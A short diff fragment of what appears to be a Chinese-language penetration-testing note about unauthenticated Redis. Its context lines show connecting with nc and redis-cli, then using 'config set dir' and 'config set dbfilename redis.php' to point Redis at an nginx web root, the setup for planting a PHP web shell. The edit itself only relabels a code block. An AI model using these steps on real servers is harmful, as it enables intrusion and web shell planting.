@@ -14,8 +14,8 @@ PORT     STATE SERVICE
 nc或者redis-cli连接
 nc -vn 10.10.10.10 6379
 redis-cli -h 10.10.10.10
-```bash
 
+```sql
 10.85.0.52:6379> config set dir /usr/share/nginx/html
 OK
 10.85.0.52:6379> config set dbfilename redis.php
